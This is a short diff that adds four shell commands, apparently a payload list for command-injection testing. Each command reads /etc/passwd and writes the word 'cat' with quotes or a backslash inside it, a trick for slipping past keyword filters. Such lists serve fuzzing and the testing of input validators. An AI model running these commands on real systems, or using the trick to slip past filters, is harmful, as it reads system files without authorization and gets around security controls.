@@ -1,0 +1,4 @@
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+ca''t /etc/passwd
